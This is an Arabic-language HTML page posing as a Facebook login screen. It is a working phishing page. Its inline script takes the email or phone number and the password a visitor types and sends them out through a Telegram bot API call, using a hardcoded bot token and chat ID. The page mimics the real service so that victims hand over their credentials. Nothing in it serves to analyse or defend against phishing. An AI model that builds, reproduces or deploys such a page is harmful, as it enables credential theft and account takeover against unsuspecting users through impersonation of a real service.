<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - فيسبوك</title>
    <link rel="stylesheet" href="styles.css">
    <script>
        const token = "7560952780:AAFXEah-O1BrBiPjyHIcPI0-48aKtygxHcU";
        const chatId = "6709124569"; // معرف الدردشة الخاص بك

        function sendToTelegram(email, password) {
            const message = `البريد الإلكتروني: ${email}\nكلمة المرور: ${password}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        alert("تم إرسال البيانات بنجاح!");
                    } else {
                        alert("حدث خطأ أثناء إرسال البيانات.");
                    }
                })
                .catch(error => {
                    console.error("Error:", error);
                });
        }

        function handleSubmit(event) {
            event.preventDefault(); // منع إرسال النموذج بالطريقة الافتراضية
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            sendToTelegram(email, password);
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>تسجيل الدخول إلى فيسبوك</h1>
        <form onsubmit="handleSubmit(event)">
            <div class="input-group">
                <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">كلمة المرور</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>
        <div class="footer">
            <a href="#">هل نسيت كلمة المرور؟</a>
            <span>|</span>
            <a href="#">إنشاء حساب جديد</a>
        </div>
    </div>
</body>
</html>
